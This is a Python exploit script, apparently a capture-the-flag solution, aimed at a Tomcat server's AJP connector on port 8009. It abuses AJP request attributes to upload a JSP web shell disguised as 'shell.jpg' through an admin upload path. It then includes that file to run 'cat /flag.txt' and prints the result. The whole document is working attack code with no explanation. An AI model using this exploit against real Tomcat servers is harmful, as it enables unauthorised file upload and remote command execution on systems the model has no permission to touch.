import sys
import os
from io import BytesIO
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from tomcat import Tomcat
import time

#proxy
import socks
import socket
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 8081)
socket.socket = socks.socksocket

target_host = "sctf2020tomcat.syclover"
gc = Tomcat(target_host, 8009)

filename = "shell.jpg"
payload = "<% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"cat /flag.txt\").getInputStream())).readLine()); %>"

with open("./request", "w+b") as f:
    s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % filename
    s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
    f.write(s_form_header.encode('utf-8'))
    f.write(payload.encode('utf-8'))
    f.write(s_form_footer.encode('utf-8'))

data_len = os.path.getsize("./request")

headers = {
        "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
        "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
}

attributes = [
    {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.request_uri", "/;/admin/upload", )
    }
    , {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.path_info", "/", )
    }
    , {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.servlet_path", "", )
    }
, ]

hdrs, data = gc.perform_request("/", headers=headers, method="POST",  attributes=attributes)

with open("./request", "rb") as f:
    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
    responses = br.send_and_receive(gc.socket, gc.stream)

r = AjpResponse()
r.parse(gc.stream)

shell_path = r.data.decode('utf-8').strip('\x00').split('/')[-1]
print("="*50)
print(shell_path)
print("="*50)

gc = Tomcat(target_host, 8009)

attributes = [
    {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
    {"name": "req_attribute", "value": ("javax.servlet.include.path_info", shell_path,)},
    {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
]

time.sleep(0.5)

hdrs, data = gc.perform_request("/uploads/1.jsp", attributes=attributes)
output = sys.stdout

for d in data:
    try:
        output.write(d.data.decode('utf8'))
    except UnicodeDecodeError:
        output.write(repr(d.data))
